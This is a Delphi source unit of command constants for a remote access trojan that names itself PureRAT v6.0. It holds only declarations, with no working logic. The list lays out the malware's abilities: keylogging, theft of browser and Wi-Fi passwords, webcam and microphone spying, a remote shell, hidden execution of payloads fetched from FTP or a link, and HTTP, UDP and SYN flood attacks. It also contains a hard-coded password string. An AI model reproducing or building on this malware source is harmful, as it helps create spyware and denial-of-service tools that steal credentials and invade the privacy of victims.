unit UnitConstants;

interface

const
  //About program
  PROGRAMNAME = 'PureRAT';
  PROGRAMVERSION = 'v6.0';
  PROGRAMAUTHOR = 'Wr #!d3';
  PROGRAMPASSWORD = PROGRAMNAME + '²³¤¼½¾' + PROGRAMAUTHOR;

  //Commands list
  ACTIVECONNECTIONS = 'activeconnections';
  ACTIVECONNECTIONSCLOSE = 'activeconnectionsclose';     
  ACTIVECONNECTIONSKILLPROCESS = 'activeconnectionskillprocess';
  ACTIVECONNECTIONSLIST = 'activeconnectionslist';
                              
  CDDRIVECLOSE = 'cddriveclose';
  CDDRIVEOPEN = 'cddriveopen';
     
  CHAT = 'chat';
  CHATSTART = 'chatstart';
  CHATSTOP = 'chatstop';
  CHATTEXT = 'chattext';

  CLIENTCLOSE = 'clientclose';
  CLIENTNEW = 'clientnew';
  CLIENTRENAME = 'clientrename';  
  CLIENTREMOVE = 'clientremove';
  CLIENTRESTART = 'clientrestart';                               
  CLIENTUPDATEFROMFTP = 'clientupdatefromftp';
  CLIENTUPDATEFROMLINK = 'clientupdatefromlink';
  CLIENTUPDATEFROMLOCAL = 'clientupdatefromlocal';

  CLIPBOARD = 'clipboard';          
  CLIPBOARDCLEAR = 'clipboardclear';    
  CLIPBOARDFILES = 'clipboardfiles';
  CLIPBOARDTEXT = 'clipboardtext';
  CLIPBOARDSETTEXT = 'clipboardsettext';

  COMPUTERLOGOFF = 'computerlogoff';    
  COMPUTERREBOOT = 'computerreboot';
  COMPUTERSHUTDWON = 'computershutdown';
      
  DELIMITER = #13#10;
  
  DESKTOP = 'desktop';                
  DESKTOPCAPTURESTART = 'desktopcapturestart';
  DESKTOPHIDEICONS = 'desktophideicons';      
  DESKTOPHIDESYSTEMTRAY = 'desktophidesystemtray';
  DESKTOPHIDETASKSBAR = 'desktophidetasksbar';
  DESKTOPIMAGE = 'desktopimage';
  DESKTOPSETTINGS = 'desktopsettings';  
  DESKTOPSHOWICONS = 'desktopshowicons';   
  DESKTOPSHOWSYSTEMTRAY = 'desktopshowsystemtray';
  DESKTOPSHOWTASKSBAR = 'desktopshowtasksbar';
  DESKTOPTHUMBNAIL = 'desktopthumbnail';

  EXECUTESHELLCOMMAND = 'executeshellcommand';

  FILESMANAGER = 'filesmanager';

  FILESCOPYFILE = 'filescopyfile';
  FILESCOPYFOLDER = 'filescopyfolder';
  FILESDELETEFILE = 'filesdeletefile';
  FILESDELETEFOLDER = 'filesdeletefolder';  
  FILESDOWNLOADFILE = 'filesdownloadfile';
  FILESDRIVESINFOS = 'filesdrivesinfos';   
  FILESEDITFILE = 'fileseditfile';
  FILESEXECUTEFROMFTP = 'filesexecutefromftp';
  FILESEXECUTEFROMLINK = 'filesexecutefromlink';
  FILESEXECUTEFROMLOCAL = 'filesexecutefromlocal';
  FILESEXECUTEHIDEN = 'filesexecutehiden';
  FILESEXECUTEVISIBLE = 'filesexecutevisible';
  FILESIMAGEPREVIEW = 'filesimagepreview';
  FILESLISTDRIVES = 'fileslistdrives'; 
  FILESLISTFILES = 'fileslistfiles';
  FILESLISTFOLDERS = 'fileslistfolders';  
  FILESLISTSHAREDFOLDERS = 'fileslistsharedfolders';
  FILESLISTSPECIALSFOLDERS = 'fileslistspecialsfolders';
  FILESMOVEFILE = 'filesmovefile';
  FILESMOVEFOLDER = 'filesmovefolder';  
  FILESMULTIDOWNLOAD = 'filesmultidownload';
  FILESNEWFOLDER = 'filesnewfolder';
  FILESRENAMEFILE = 'filesrenamefile';
  FILESRENAMEFOLDER = 'filesrenamefolder';   
  FILESRESUMEDOWNLOAD = 'filesresumedownload';
  FILESSEARCHFILE = 'filessearchfile';       
  FILESSEARCHIMAGEPREVIEW = 'filessearchimagepreview';
  FILESSEARCHRESULTS = 'filessearchresults';
  FILESSENDFTP = 'filessendftp';
  FILESSTOPSEARCHING = 'filestopsearching';      
  FILESUPLOADFILEFROMFTP = 'filesuploadfilefromlftp'; 
  FILESUPLOADFILEFROMLINK = 'filesuploadfilefromlink';
  FILESUPLOADFILEFROMLOCAL = 'filesuploadfilefromlocal';
  FILESVIEWFILE = 'filesviewfile';

  FLOODHTTPSTART = 'floodhttpstart';
  FLOODHTTPSTOP = 'floodhttpstop';
  FLOODUDPSTART = 'floodudpstart';
  FLOODUDPSTOP = 'floodudpstop';
  FLOODSYNSTART = 'floodsynstart';
  FLOODSYNSTOP = 'floodsynstop';

  INFOS = 'infos';
  INFOSMAIN = 'infosmain';
  INFOSREFRESH = 'infosrefresh';
  INFOSSYSTEM = 'infossystem';

  KEYLOGGER = 'keylogger';
  KEYLOGGERDELLOG = 'keyloggerdellog'; 
  KEYLOGGERDELREPO = 'keyloggerdelrepo';    
  KEYLOGGERGETLOGS = 'keyloggergetlogs';
  KEYLOGGERGETREPO = 'keyloggergetrepo';
  KEYLOGGERLIVESTART = 'keyloggerlivestart';
  KEYLOGGERLIVESTOP = 'keyloggerlivestop';
  KEYLOGGERLIVETEXT = 'keyloggerlivetext'; 
  KEYLOGGERREADLOG = 'keyloggerreadlog';

  MESSAGESBOX = 'messagesbox';
        
  MICROPHONE = 'microphone';
  MICROPHONESTART = 'microphonestart';
  MICROPHONESTOP = 'microphonestop';
  MICROPHONESTREAM = 'microphonestream';

  MOUSELEFTCLICK = 'mouseleftclick';   
  MOUSELEFTDOUBLECLICK = 'mouseleftdoubleclick';   
  MOUSEMOVECURSOR = 'mousemovecurosr';
  MOUSERIGHTCLICK = 'mouserightclick';
  MOUSERIGHTDOUBLECLICK = 'mouserightdoubleclick';
  MOUSESWAPBUTTONS = 'mouseswapbuttons';
        
  PASSWORDS = 'passwords';        
  PASSWORDSBROWSERS = 'passwordsbrowsers';
  PASSWORDSWIFI = 'passwordswifi';
                            
  PING = 'ping';
  
  PLUGINSCHECK = 'pluginscheck';
  PLUGINSUPLOAD = 'pluginsupload';
                                         
  PORTSCANNERRESULTS = 'portscannerresults';
  PORTSCANNERSTART = 'portscannerstart';
  PORTSCANNERSTOP = 'portscannerstop';

  PORTSNIFFER = 'portsniffer';
  PORTSNIFFERINTERFACES = 'portsnifferinterfaces';  
  PORTSNIFFERRESULTS = 'portsnifferresults';
  PORTSNIFFERSTART = 'portsnifferstart';
  PORTSNIFFERSTOP = 'portsnifferstop';

  PONG = 'pong';

  PROCESS = 'process';  
  PROCESSKILL = 'processkill';
  PROCESSLIST = 'processlist'; 
  PROCESSRESUME = 'processresume';
  PROCESSSUSPEND = 'processsuspend';

  PROGRAMS = 'programs';
  PROGRAMSLIST = 'programslist';  
  PROGRAMSSILENTUNINSTALL = 'programssilentuninstall';
  PROGRAMSUNINSTALL = 'programsuninstall';

  PROXYSTART = 'proxystart';
  PROXYSTOP = 'proxystop';

  REGISTRY = 'registry';       
  REGISTRYADDKEY_VALUE = 'registryaddkey_value';
  REGISTRYDELETEKEY_VALUE = 'registrydeletekey_value';
  REGISTRYLISTKEYS = 'registrylistkeys';
  REGISTRYLISTVALUES = 'registrylistvalues';
  REGISTRYRENAMEKEY = 'registryrenamekey';

  SERVICES = 'services';     
  SERVICESEDIT = 'servicesedit';
  SERVICESINSTALL = 'servicesinstall';
  SERVICESLIST = 'serviceslist';
  SERVICESSTART = 'servicesstart';
  SERVICESSTOP = 'servicesstop';
  SERVICESUNINSTALL = 'servicesuninstall';

  SCRIPT = 'script';
  SCRIPTVBS = 'scriptvbs';

  SHELL = 'shell';      
  SHELLCOMMAND = 'shellcommand';
  SHELLDATAS = 'shelldatas';
  SHELLSTART = 'shellstart';
  SHELLSTOP = 'shellstop';

  TASKSMANAGER = 'tasksmanager';

  UPDATEERROR = 'updateerror';

  WEBCAM = 'webcam';   
  WEBCAMCONNECT = 'webcamconnect';
  WEBCAMDISCONNECT = 'webcamdisconnect';  
  WEBCAMIMAGE = 'webcamimage';
  WEBCAMSETTINGS = 'webcamsettings';

  WINDOWS = 'windows';   
  WINDOWSCLOSE = 'windowsclose';   
  WINDOWSDISABLECLOSEBUTTON = 'windowsdisableclosebutton';
  WINDOWSHIDE = 'windowshide';
  WINDOWSLIST = 'windowslist';       
  WINDOWSLISTMESSAGESBOX = 'windowslistmessagesbox';
  WINDOWSSHAKE = 'windowsshake';
  WINDOWSSHOW = 'windowsshow';       
  WINDOWSTHUMBNAILS = 'windowsthumbnails';
  WINDOWSTITLE = 'windowstitle';

implementation

end.
